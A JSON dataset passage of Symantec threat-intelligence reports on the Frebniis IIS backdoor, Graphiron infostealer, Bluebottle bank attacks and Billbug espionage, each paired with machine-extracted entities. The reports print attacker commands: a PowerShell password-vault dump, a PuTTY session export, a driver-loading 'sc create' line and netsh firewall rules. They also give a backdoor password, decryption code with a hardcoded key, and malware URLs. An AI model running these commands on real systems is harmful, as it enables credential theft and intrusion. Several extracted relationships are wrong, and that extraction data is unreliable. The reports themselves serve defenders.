port, HTTP headers with cookies, etc. A feature called Failed Request Tracing can be used to troubleshoot IIS failed requests. Failed Request Tracing buffers the trace events for a request and flushes them to disk if the request meets the definition of “fail” set by the user. Failed request tracing can, for example, be used to learn why requests are returning a specific HTTP status code (401 or 404, etc.), or why a request is taking too long to process, or is not responding. Frebniis ensures Failed Request Tracing is enabled and then accesses w3wp.exe (IIS) process memory, obtaining the address of where the Failed Request Event Buffering code (iisfreb.dll) is loaded.  With this code start address, Frebniis searches from there for a function pointer table to hijack code execution. The authors of Frebniis have determined that a particular function pointer within iisfreb.dll is called by iiscore.dll whenever any HTTP request is made to IIS from a web client. This function normally checks if the content of the HTTP request matches the Failed Request Tracing rules. Frebniis hijacks this function by injecting its own malicious code into IIS process memory and then replacing this function pointer with the address of its own malicious code. This hijack point allows Frebniis to stealthily receive and inspect every HTTP request to the IIS server before returning to the original function. The Frebniis malicious injected code parses all received HTTP POST requests for /logon.aspx or /default.aspx along with a parameter password set to ‘7ux4398!’. If the password matches, Frebniis decrypts and executes a section of the injected code, which is .NET executable code consisting of the main backdoor functionality. No executables are saved to disk in this process, keeping the backdoor completely stealthy. The .NET code provides proxying functionality and remote code execution controlled by a provided second HTTP parameter that is a Base64 encoded string. To enable the proxy, the encoded string is Base64 decoded and then decrypted (xor 0x08), with the first character representing a proxy command followed by expected parameters. The proxy is used to send and receive Base64 encoded data from other computer systems. This allows the attackers to communicate with internal resources that may normally be blocked from the internet via the compromised IIS server. The .NET backdoor code also supports remote execution. If an HTTP call to logon.aspx or default.aspx is received without the password parameter, but with the Base64 string, the Base64 string is assumed to be C# code that will be executed straight in memory. The Base64 string is decoded and then decrypted (xor 0x08) and is expected to be an XML document with the C# code to be executed in the ‘/doc’ node under the ‘data’ attribute (E.g. <doc data=C# code>).  The C# code is extracted and executed. This allows Frebniis to stealthily execute arbitrary code on the system. By hijacking and modifying IIS web server code, Frebniis is able to intercept the regular flow of HTTP request handling and look for specially formatted HTTP requests. These requests allow remote code execution and proxying to internal systems in a stealthy manner. No files or suspicious processes will be running on the system, making Frebniis a relatively unique and rare type of HTTP backdoor seen in the wild. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 6464f9a5da26aa53fb2221255e908fd4da8edf0633f94051beee74a14b9b001c – Backdoor.Frebniis b81c177c440e84635f22dc97b0411de93a24a983a41af676ffbbb4439487aaef – Backdoor.Frebniis The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Broadcom Software, Tool), (Frebniis, Malware), (Backdoor.Frebniis, Malware), (Failed Request Event Buffering, Technique), (Windows System, Tool), (IIS, Tool), (HTTP Requests, Object), (Failed Request Tracing, Technique), (HTML Pages, Object), (IIS Web Server, Tool), (Failed Request Events, Object), (IIS Feature, Object)\nRelationships: (Symantec, observes, Frebniis), (Symantec, uses, Broadcom Software), (Frebniis, uses, Failed Request Event Buffering), (Frebniis, uses, Failed Request Tracing), (Frebniis, targets, Taiwan), (Frebniis, exploitedBy, current unknown threat actor), (current unknown threat actor, gainsAccessTo, Windows System), (current unknown threat actor, uses, IIS), (current unknown threat actor, uses, HTTP Requests), (current unknown threat actor, recognizes, specially formatted HTTP requests), (current unknown threat actor, executesRemoteCode, via), (current unknown threat actor, requires, access to IIS server), (current unknown threat actor, achievesAccess, some other means), (IIS, runsOn, Windows System), (IIS, serves, HTML pages), (IIS, features, Failed Request Event Buffering), (IIS, features,",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Tool"
        ],
        [
          "Frebniis",
          "Malware"
        ],
        [
          "Backdoor.Frebniis",
          "Malware"
        ],
        [
          "Failed Request Event Buffering",
          "Technique"
        ],
        [
          "Windows System",
          "Tool"
        ],
        [
          "IIS",
          "Tool"
        ],
        [
          "HTTP Requests",
          "Object"
        ],
        [
          "Failed Request Tracing",
          "Technique"
        ],
        [
          "HTML Pages",
          "Object"
        ],
        [
          "IIS Web Server",
          "Tool"
        ],
        [
          "Failed Request Events",
          "Object"
        ],
        [
          "IIS Feature",
          "Object"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "observes",
          "Frebniis"
        ],
        [
          "Symantec",
          "uses",
          "Broadcom Software"
        ],
        [
          "Frebniis",
          "uses",
          "Failed Request Event Buffering"
        ],
        [
          "Frebniis",
          "uses",
          "Failed Request Tracing"
        ],
        [
          "Frebniis",
          "targets",
          "Taiwan"
        ],
        [
          "Frebniis",
          "exploitedBy",
          "current unknown threat actor"
        ],
        [
          "current unknown threat actor",
          "gainsAccessTo",
          "Windows System"
        ],
        [
          "current unknown threat actor",
          "uses",
          "IIS"
        ],
        [
          "current unknown threat actor",
          "uses",
          "HTTP Requests"
        ],
        [
          "current unknown threat actor",
          "recognizes",
          "specially formatted HTTP requests"
        ],
        [
          "current unknown threat actor",
          "executesRemoteCode",
          "via"
        ],
        [
          "current unknown threat actor",
          "requires",
          "access to IIS server"
        ],
        [
          "current unknown threat actor",
          "achievesAccess",
          "some other means"
        ],
        [
          "IIS",
          "runsOn",
          "Windows System"
        ],
        [
          "IIS",
          "serves",
          "HTML pages"
        ],
        [
          "IIS",
          "features",
          "Failed Request Event Buffering"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 16
  },
  {
    "title": "nodaria ukraine infostealer",
    "link": "https://www.security.com/threat-intelligence/nodaria-ukraine-infostealer",
    "content": "The Nodaria espionage group (aka UAC-0056) is using a new piece of information stealing malware against targets in Ukraine. The malware (Infostealer.Graphiron) is written in Go and is designed to harvest a wide range of information from the infected computer, including system information, credentials, screenshots, and files. The earliest evidence of Graphiron dates from October 2022. It continued to be used until at least mid-January 2023 and it is reasonable to assume that it remains part of the Nodaria toolkit. Graphiron is a two-stage threat consisting of a downloader (Downloader.Graphiron) and a payload (Infostealer.Graphiron). The downloader contains hardcoded command-and-control (C&C) server addresses. When executed, it will check against a blacklist of malware analysis tools by checking for running processes with the names listed in Table 1. If no blacklisted processes are found, it will connect to a C&C server and download and decrypt the payload before adding it to autorun. The downloader is configured to run just once. If it fails to download and install the payload it won’t make further attempts nor send a heartbeat. Graphiron uses AES encryption with hardcoded keys. It creates temporary files with the \".lock\" and \".trash\" extensions. It uses hardcoded file names designed to masquerade as Microsoft office executables: OfficeTemplate.exe and MicrosoftOfficeDashboard.exe The payload is capable of carrying out the following tasks: Password theft is carried out using the following PowerShell command: [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassw ord();$_} | Select UserName, Resource, Password | Format-Table –HideTableHeaders The following command was used to export the list of PuTTY sessions: \"CSIDL_SYSTEM\\reg.exe\" query HKCU\\Software\\SimonTatham\\Putty\\Sessions Graphiron has some similarities with older Nodaria tools such as GraphSteel and GrimPlant,which were first discovered by CERT-UA. GraphSteel is designed to exfiltrate files along with system information and credentials stolen from the password vault using PowerShell. Graphiron has similar functionality but can exfiltrate much more, such as screenshots and SSH keys. In addition to this, as with earlier malware, Graphiron communicates with the C&C server using port 443 and communications are encrypted using the AES cipher. Nodaria has been active since at least March 2021 and appears to be mainly involved in targeting organizations in Ukraine. There is also limited evidence to suggest that the group has been involved in attacks on targets in Kyrgyzstan. Third-party reporting has also linked the group to attacks on Georgia. The group sprang to public attention when it was linked to the WhisperGate wiper attacks that hit multiple Ukrainian government computers and websites in January 2022. When WhisperGate was initially loaded onto a system, the malware would overwrite the portion of the hard drive responsible for launching the operating system when the machine is booted up with a ransom note demanding $10,000 in Bitcoin. However, this was just a decoy as the WhisperGate malware destroys data on an infected machine and it cannot be recovered, even if a ransom is paid. The group’s usual infection vector is spear-phishing emails, which are then used to deliver a range of payloads to targets. Custom tools used by the group to date include: Like Graphiron, many of Nodaria’s earlier tools were written in Go. Graphiron appears to be the latest piece of malware authored by the same developers, likely in response to a need for additional functionality. While GraphSteel and GrimPlant used Go version 1.16, Graphiron uses version 1.18, confirming it is a more recent development. While Nodaria was relatively unknown prior to the Russian invasion of Ukraine, the group’s high-level activity over the past year suggests that it is now one of the key players in Russia’s ongoing cyber campaigns against Ukraine. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 0d0a675516f1ff9247f74df31e90f06b0fea160953e5e3bada5d1c8304cfbe63 — Downloader.Graphiron 878450da2e44f5c89ce1af91479b9a9491fe45211fee312354dfe69e967622db — Downloader.Graphiron 80e6a9079deffd6837363709f230f6ab3b2fe80af5ad30e46f6470a0c73e75a7 — Infostealer.Graphiron eee1d29a425231d981efbc25b6d87fdb9ca9c0e4e3eb393472d5967f7649a1e6 — Infostealer.Graphiron f0fd55b743a2e8f995820884e6e684f1150e7a6369712afe9edb57ffd09ad4c1 — Infostealer.Graphiron f86db0c0880bb81dbfe5ea0b087c2d17fab7b8eefb6841d15916ae9442dd0cce — Infostealer.Graphiron 208.67.104[.]95 — C&C server The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Nodaria, Attacker), (UAC-0056, Attacker), (Infostealer.Graphiron, Malware), (Downloader.Graphiron, Tool), (Infostealer.Graphiron, Tool), (AES, Technique), (Table 1, Hash), (OfficeTemplate.exe, File), (MicrosoftOfficeDashboard.exe, File)\nRelationships: (Nodaria, uses, Infostealer.Graphiron), (Nodaria, uses, Downloader.Graphiron), (Nodaria, uses, AES), (Nodaria, uses, Table 1), (Nodaria, linkedTo, UAC-0056), (Nodaria, linkedTo, Infostealer.Graphiron), (Nodaria, linkedTo, Downloader.Graphiron), (Nodaria, linkedTo, AES), (Nodaria, linkedTo, Table 1), (Nodaria, linkedTo, OfficeTemplate.exe), (Nodaria, linkedTo, MicrosoftOfficeDashboard.exe)",
      "entities": [
        [
          "Nodaria",
          "Attacker"
        ],
        [
          "UAC-0056",
          "Attacker"
        ],
        [
          "Infostealer.Graphiron",
          "Malware"
        ],
        [
          "Downloader.Graphiron",
          "Tool"
        ],
        [
          "Infostealer.Graphiron",
          "Tool"
        ],
        [
          "AES",
          "Technique"
        ],
        [
          "Table 1",
          "Hash"
        ],
        [
          "OfficeTemplate.exe",
          "File"
        ],
        [
          "MicrosoftOfficeDashboard.exe",
          "File"
        ]
      ],
      "relationships": [
        [
          "Nodaria",
          "uses",
          "Infostealer.Graphiron"
        ],
        [
          "Nodaria",
          "uses",
          "Downloader.Graphiron"
        ],
        [
          "Nodaria",
          "uses",
          "AES"
        ],
        [
          "Nodaria",
          "uses",
          "Table 1"
        ],
        [
          "Nodaria",
          "linkedTo",
          "UAC-0056"
        ],
        [
          "Nodaria",
          "linkedTo",
          "Infostealer.Graphiron"
        ],
        [
          "Nodaria",
          "linkedTo",
          "Downloader.Graphiron"
        ],
        [
          "Nodaria",
          "linkedTo",
          "AES"
        ],
        [
          "Nodaria",
          "linkedTo",
          "Table 1"
        ],
        [
          "Nodaria",
          "linkedTo",
          "OfficeTemplate.exe"
        ],
        [
          "Nodaria",
          "linkedTo",
          "MicrosoftOfficeDashboard.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 11
  },
  {
    "title": "bluebottle banks targeted africa",
    "link": "https://www.security.com/threat-intelligence/bluebottle-banks-targeted-africa",
    "content": "Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign. The activity observed by Symantec, a division ofBroadcom Software, appears to be a continuation of activity documented in aGroup-IB report from November 2022. The activity documented by Group-IB spanned from mid-2019 to 2021, and it said that during that period this group, which it called OPERA1ER, stole at least $11 million in the course of 30 targeted attacks. Similarities in the tactics, techniques, and procedures (TTPs) between the activity documented by Group-IB and the activity seen by Symantec include: While this does appear to be a continuation of the activity documented by Group-IB, the activity seen by Symantec is more recent, running from at least July 2022 to September 2022, though some of the activity may have begun as far back as May 2022. Some new TTPs have also been employed in recent attacks, including: The initial infection vector is unknown, but the earliest malicious files found on victim networks had French-language, job-themed file names. These likely acted as lures. In some cases, the malware was named to trick the user into thinking it was a PDF file, e.g.: It’s most likely these files were delivered to victims via a spear-phishing email, which would align with the initial infection vector documented by Group-IB for the OPERA1ER activity. Although the majority of the activity observed by Symantec researchers began in July 2022, at least one victim was found to have an infostealer with a similar naming theme on its network as early as mid-May 2022. In that case, the malware arrived in the form of a ZIP file containing an executable SCR file. The file is an older, likely commodity, malware. It's difficult to determine when it was used to target the organization. It is, however, consistent with infection vectors reported as used by OPERA1ER in 2021. However, the job-themed malware in July was observed in paths suggesting it had been mounted as CD-ROMs. This could indicate a genuine disc was inserted, but it could also be that a malicious ISO file was delivered to victims and mounted. An ISO file is an archive file that contains an identical copy or image of the data that would be found on an optical disc. Malicious ISO files have been used as an initial infection vector in other campaigns in 2022, including being used alongside theBumblebee loader in a campaign where delivering ransomware was the ultimate goal. If the Bluebottle and OPERA1ER actors are indeed one and the same, this would mean that they swapped out their infection techniques between May and July 2022. ISO files were not seen in the activity documented by Group-IB. In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity wasieinstal.exe, the Internet Explorer Add-on Installer, but also includedaspnet_regbrowsers.exe, the ASP.NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious .NET downloader from URLs such ashxxp://178.73.192[.]15/ca1.exe. Multiple .NET downloaders were found that abused the file transfer servicetransfer[.]shto download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a .NET DLL. After GuLoader and the .NET loaders were deployed, various other post-compromise tools were seen on victim networks. These include the publicly available Netwire remote access Trojan (RAT) and the open-source Quasar RAT. The attackers also used the commercial post-compromise tool Cobalt Strike Beacon. The Cobalt Strike Beacon variant used by Bluebottle employed an API hammering technique in order to hamper analysis. A set of malware was also deployed by the attackers that had the likely goal of disabling the security products on victim networks. The malware consisted of two components, a controlling DLL that reads a list of processes from a third file, and a signed 'helper' driver controlled by the first driver and used to terminate the processes in the list. Attackers used Windows Service Control (sc.exe) to load the driver: sc create fgt binPath= %TEMP%\\fgt.sys type= kernel In August 2022, Symantec observed the same driver being used in suspected pre-ransomware attack activity against a non-profit in Canada. Another tool found on the victim network was Infostealer.Eamfo,a hacktool that has been associated with Cuba, Noberus, and Lockbit ransomware attacks. The same driver also appears to have been used by multiple groups for similar purposes.Mandiant documented a financially motivated threat groupit calls UNC3944 using this same driver to disable defenses. It referred to this driver as POORTRY and the malware that uses it as STONESTOP. However, Mandiant did note at the time that “POORTRY appears across different threat groups and is consistent with malware available for purchase or shared freely between different groups.” Sophos also documented an instance where Cuba ransomware operatorsused a loader called BURNTCIGAR to load signed driversto kill defenses. The loader operates similarly to the malicious DLL seen in this activity. These drivers were reported to Microsoft by other vendors, and the company suspended the developer accounts andadded defenses to address them. The short-term goal of Bluebottle in this recent activity appears in part to be persistence and credential theft. The actors used credential theft techniques and tools, such as modifying the WDigest setting and deploying Mimikatz, as well as an open-source fake login screen keylogger. For lateral movement, the attackers deployed the penetration testing tool SharpHound for domain trust enumeration and executed additional files across the victim organizations using PsExec. For persistence, evidence suggests the attackers added additional accounts using the'net localgroup /add'command. They also deployed an open-source RDPWrap script to enable multiple concurrent RDP sessions on victim systems. This script also modifies the registry and opens port 3389 on the firewall to allow RDP traffic through. Indications are that this activity was likely “hands-on-keyboard” activity rather than automated. While we do not see what further activity is carried out by the attackers, the victims and the crossover with the activity documented by Group-IB all indicate that this activity is likely financially motivated. Three different financial institutions in three African nations were compromised in the activity seen by Symantec, with multiple machines infected in all three organizations. The activity on one of the infected institution’s networks ran as follows: The first activity was seen in mid-July 2022, when job-themed malware was spotted on the infected system. A downloader was then deployed, before the Sharphound hacktool was detected and a tool called fakelogonscreen was also deployed. About three weeks after the initial compromise of the network, the attackers were seen using a command prompt and PsExec for lateral movement. It appears the attackers were “hands on keyboard” at this point of the attack. The attackers used various dual-use and living-off-the-land tools for numerous purposes, including: Malicious tools used included: Multiple other unknown files were also deployed on this network. The last activity seen on this network was in September 2022, but the Ngrok tunneling tool remained on the network until November 2022. Some of the same tools were also deployed on the other victims, with GuLoader seen in all three victims. Other activity linking the activity in all three victims includes: While Symantec cannot confirm whether or not Bluebottle successfully monetized the campaigns we saw it carrying out, the group’s success at monetizing its activity between 2019 and 2021, as documented by Group-IB, indicates that this group has had a significant amount of success in the past. The effectiveness of its campaigns means that Bluebottle is unlikely to stop this activity. It appears to be very focused on Francophone countries in Africa, so financial institutions in these countries should remain on high alert for the activity documented in this blog. The attackers appear to be French-speaking, so the possibility of them expanding this activity to French-speaking nations in other regions also cannot be ruled out. For the latest protection updates, please visit theSymantec Protection Bulletin. 117c66c0aa3f7a5208b3872806d481fd8d682950573c2a7acaf7c7c7945fe10d — ZIP file c56c915cd0bc528bdb21d6037917d2e4cde18b2ef27a4b74a0420a5f205869e6 —  Infostealer 91b3546dde60776ae3ed84fdf4f6b5fba7d39620f0a6307280265cde3a33206b — .NET downloader 9c4c9fa4d8935df811cae0ce067de54ffdb5cfb4f99b4bc36c5aa2a1ac6f9c8f — .NET downloader 1f6be4c29dfb50f924377444e5ca579d3020985a357533fc052226f0091febf6 — .NET downloader d5b8009dcb50aac8a889e24f038a52fe09721d142a3f1eaa74ac37fff45e9ba2 — .NET downloader ae4ff662c959cf24df621a2c0b934ed1fa1c26a270a180f695cd5295579afbbd — .NET downloader 0612ef9d2239edeab05f421e3188e2cfcadacbaeafbc9b8e35e778f7234aaa3b — .NET downloader 4acd4335ca43783ff52c0ccbb7e757ea14fb261c33d08268e85ed0ac34e0abec — .NET downloader 47718762dc043f84fb641b1e0a8c65401160cc2e558fd38c14d5d35a114b93cb — .NET downloader a539961f80feb689546a2e334b03aed81252a04fae032e2d28ed9a7000b3afff — .NET downloader 07ca6122fde46d48f71bcde356d5eeb89040e4a6e83441968a9dade98dc36fe5 — .NET loader 938f50cb2e2d670497209e8cef5bf1042f752b6bf76d1547d68040b5a27f618b — .NET loader a257eeebba15afecf76b89a379e066e5ed79a2bb9da349c1fdb5a24316abc753 —  GuLoader f276c6a25d6b865c6202978f1d409e8b74e063263eab517f249cf6d3ad3fae4a — GuLoader 3d0fd0444a9e295135ecfdc8c87ddc6dcdff63969c745e0218469332aef18dfe — GuLoader ac98e6bf6d16904355b1c706bc2b79761a8b09044da40f2c8bce35142ef8bcc8 — GuLoader ca75b0864d8308efe94eb0822de55eb7f5cfd482d2190100dfd00d433ee790a0 — GuLoader 088110b0ee3588a4822049cf60fff31c67323a9b5993eae3104cc9737a47ce0c — GuLoader b4adbb5d017d6452c2e1700584261cd3170ee5a14ac658424945f15177494ba1 — GuLoader 818284e7ea0a4bd64ba0eda664f51877ed8c6d35bf052898559dbf4ad8030968 — GuLoader fa6ca0a168f3400a00dc43f1be07296f4111d7ad9b275809217a9269dd613ae8 — GuLoader d5b3b1304739986298ba9b7c3ff8b40b3740233d6bb02437ce61a20ee87468bc — GuLoader 8495a328fdd4afd33c3336e964802018d44c1dda15b804560743d6276e926218 — GuLoader ce2ea1807d984e1392599d05f7ab742bae4f20f8ef80c5a514fbdeede2ff7e55 — Quasar RAT e933ec0f52cbc60b92134d48b08661b1af25c7d93ff5041fc704559b45bd85b8 — Netwire RAT 6db5e2bb146b11182f29d03b036af4e195044f0ef7a8f7c4429f5d4201756b8f — Cobalt Strike f4fba2181668f766fdfbd1362420a53ac0b987f999c95baf5dbe235fd3bad4b8 — Cobalt Strike ec2146655e2c04bf87b8db754dd2e92b8c48c4df47b64a9adc1252efd8618e62 — Fakelogonscreen e5633d656dea530a62f5ad2792f253e74453712be34d2eadfb49190f7a9ee10b — Malicious DLL used to register Helper Driver 0440ef40c46fdd2b5d86e7feef8577a8591de862cfd7928cdbcc8f47b8fa3ffc — Signed Helper driver 5090f311b37309767fb41fa9839d2770ab382326f38bab8c976b83ec727e6796 — Sharphound 5e245281f4924c139dd90c581fc79105ea19980baa68eeccf5bf36ae613399b9 — PsExec 31eb1de7e840a342fd468e558e5ab627bcb4c542a8fe01aec4d5ba01d539a0fc — Mimikatz hxxp://files[.]ddrive[.]online:444/load hxxp://85.239.34[.]152/download/XWO_UnBkJ213.bin hxxps://transmissive-basin[.]000webhostapp[.]com hxxps://udapte[.]adesy[.]in banqueislamik[.]ddrive[.]online hxxps://transfer[.]sh/get/mKwvWI/NHmZJu.rtf hxxps://transfer[.]sh/get/RTPlqa/oISxUP.rtf hxxp://files[.]ddrive[.]online:4448/a hxxp://banqueislamik[.]ddrive[.]online:4448/ZPjH hxxp://46.246.86[.]12/ca3.exe hxxp://178.73.192[.]15/ca1.exe personnel[.]bdm-sa[.]fr The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Bluebottle, Attacker), (living off the land, Technique), (dual-use tools, Tool), (commodity malware, Malware), (operated by, employs), (Symantec, Tool), (Group-IB, Report), (OPERA1ER, Attacker), (French-speaking countries, Target), (targeted attacks, Campaign), (financial sector, Target), (BMC Software, Company), (July 2022, Time Period), (September 2022, Time Period), (May 2022, Time Period), (mid-2019 to 2021, Time Period), (30 targeted attacks, Number), (PDF, File), (lure, Lure), (spear-phishing email, Method), (file name, File Name)\nRelationships: (Bluebottle, uses, living off the land), (Bluebottle, uses, dual-use tools), (Bluebottle, uses, commodity malware), (Bluebottle, operatesBy, Symantec), (Bluebottle, attributedTo, OPERA1ER), (OPERA1ER, campaigns, targeted attacks), (OPERA1ER, steals, $11 million), (OPERA1ER, attacks, 30), (symantec, observes, activity), (group-ib, reports, activity), (group-ib, spans,",
      "entities": [
        [
          "Bluebottle",
          "Attacker"
        ],
        [
          "living off the land",
          "Technique"
        ],
        [
          "dual-use tools",
          "Tool"
        ],
        [
          "commodity malware",
          "Malware"
        ],
        [
          "operated by",
          "employs"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "Group-IB",
          "Report"
        ],
        [
          "OPERA1ER",
          "Attacker"
        ],
        [
          "French-speaking countries",
          "Target"
        ],
        [
          "targeted attacks",
          "Campaign"
        ],
        [
          "financial sector",
          "Target"
        ],
        [
          "BMC Software",
          "Company"
        ],
        [
          "July 2022",
          "Time Period"
        ],
        [
          "September 2022",
          "Time Period"
        ],
        [
          "May 2022",
          "Time Period"
        ],
        [
          "mid-2019 to 2021",
          "Time Period"
        ],
        [
          "30 targeted attacks",
          "Number"
        ],
        [
          "PDF",
          "File"
        ],
        [
          "lure",
          "Lure"
        ],
        [
          "spear-phishing email",
          "Method"
        ],
        [
          "file name",
          "File Name"
        ]
      ],
      "relationships": [
        [
          "Bluebottle",
          "uses",
          "living off the land"
        ],
        [
          "Bluebottle",
          "uses",
          "dual-use tools"
        ],
        [
          "Bluebottle",
          "uses",
          "commodity malware"
        ],
        [
          "Bluebottle",
          "operatesBy",
          "Symantec"
        ],
        [
          "Bluebottle",
          "attributedTo",
          "OPERA1ER"
        ],
        [
          "OPERA1ER",
          "campaigns",
          "targeted attacks"
        ],
        [
          "OPERA1ER",
          "steals",
          "$11 million"
        ],
        [
          "OPERA1ER",
          "attacks",
          "30"
        ],
        [
          "symantec",
          "observes",
          "activity"
        ],
        [
          "group-ib",
          "reports",
          "activity"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 21,
    "relationship_count": 10
  },
  {
    "title": "espionage asia governments cert authority",
    "link": "https://www.security.com/threat-intelligence/espionage-asia-governments-cert-authority",
    "content": "State-sponsored actors compromised a digital certificate authority in an Asian country during a campaign in which multiple government agencies were also targeted. Symantec, byBroadcom Software, was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group. Billbug (aka Lotus Blossom, Thrip) is a long-established advanced persistent threat (APT) group that is believed to have been active since at least 2009. Symantec has previously published on thisgroup’s activity in 2018and 2019 under the Thrip name, but followingour 2019 investigation, we determined that Thrip and Billbug were most likely the same group so now track all activity under the Billbug name. In activity documented by Symantec in 2019, we detailed how the group was using a backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Both these tools were also seen in this more recent activity. The victims in this campaign included a certificate authority, as well as government and defense agencies. All the victims were based in various countries in Asia. Billbug is known to focus on targets in Asian countries. In at least one of the government victims, a large number of machines on the network were compromised by the attackers. The targeting of a certificate authority is notable, as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate, and help it avoid detection on victim machines. It could also potentially use compromised certificates to intercept HTTPS traffic. However, although this is a possible motivation for targeting a certificate authority, Symantec has seen no evidence to suggest they were successful in compromising digital certificates. Symantec has notified the cert authority in question to inform them of this activity. This activity has been ongoing since at least March 2022. There are some indications that the attackers are exploiting public-facing applications to gain initial access to victim networks. The attackers use multiple dual-use tools in this attack campaign, as well as custom malware. Billbug’s extensive use of dual-use and living-off-the-land tools was also notable in its previous campaigns. Among the dual-use tools leveraged in this recent activity are: Multiple files that are believed to be loaders for the Hannotog backdoor were spotted on victim machines. A backdoor was then deployed on the compromised system. This backdoor has multiple functionalities: netsh advfirewall firewall add rule name=\"Core Networking - Router Solicitation (ICMP-In)\" dir=in action=allow program=\"%s\" enable=yesnetsh firewall add portopening UDP 5900 @xpsp2res.dll,-22006 ENABLE ALL',0netsh firewall add allowedprogram name=\"SNMP Trap Service\" program=\"%s\" mode=enable A tool called Stowaway Proxy Tool was also downloaded to victim machines. Stowaway is a multi-level proxy tool written in the Go language and intended for use by penetration testers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through intranet access restrictions, construct a tree-like node network, and easily implement management functions. It is not unusual to see penetration testing tools misused by threat actors. Cobalt Strike, which is a penetration testing framework, is considered commodity malware by many due to how often it is used by malicious actors. The Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command-and-control (C&C) server. The analyzed sample had no hardcoded configuration, so it had to be dropped on the machine by a loader malware, such as Hannotog. In the sample analyzed by Symantec, configuration is passed to the sample via a parameter of the exported function (called MainEntry). That configuration is decrypted with a simple XOR operation: return xor(x, b\"\\xad\" + x[:-1]) Next, the sample finds the explorer.exe process and uses it to change the token of the current thread. It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists. These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = b'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x77\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x22\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x35\\x91\\x37'realkey = datasample[:0x10]+ b'\\x00' * 0x10 for i in range(0x2000):realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(\"checksum\", raw[-32:].hex())return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware. The same encryption algorithm is used for network communication. The encrypted data structure is as follows: struct encrypted_data {byte[16] IV;byte[N] message_data;  // always divisible by 16, padding added as necessarybyte[32] sha256_checksum;} The sample stores configuration and state in the following file: %appdata%/microsoft/protect/windows/DMI%X.DAT(where %X is variable and depends on the parameter with which sample was started). It is also encrypted, but with RC4. This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead. The config file modification date will always be in the year 2011 – the “file last edit” year is changed by the malware to 2011. Network communication In normal mode, the sample will try all the following supported connection modes in this order. In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32). - 1: httpsviaconfigproxy: HTTPS with configured proxy - 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: httpsviaiexproxy: self-explanatory. Use proxy from \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ProxyServer - 4: httpsviafirefoxproxy - get proxy from \\\\Mozilla\\\\Firefox\\\\profiles.ini (one of FF config files) - 5: httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser - 6: httpspreconfig -tryto connect without proxy The network packet is composed of two parts: the header and the payload. Both are encrypted separately. struct network_packet {byte[64] encrypted_header;  // see encrypted_data abovebyte[N] encrypted_payload;  // see encrypted_data above} The structure of the decrypted header is as follows: struct header {int32 command_id;int16 packet_length;int32 packet_crc32;} The structure of the decrypted payload mostly depends on the command ID. The list of supported commands includes: While we do not see data being exfiltrated in this campaign, Billbug is widely regarded as being an espionage actor, indicating that data theft is the most likely motivation in this campaign. The victims in this campaign – government agencies and a certificate authority – also point to an espionage and data-theft motive. The targeting of the government victims is most likely driven by espionage motivations, with the certificate authority likely targeted in order to steal legitimate digital certificates, as mentioned in the introduction. This is potentially very dangerous, as if Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines. The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well-resourced operator that is capable of carrying out sustained and wide-ranging campaigns. Billbug also appears to be undeterred by the possibility of having this activity attributed to it, with it reusing tools that have been linked to the group in the past. For the latest protection updates, please visit theSymantec 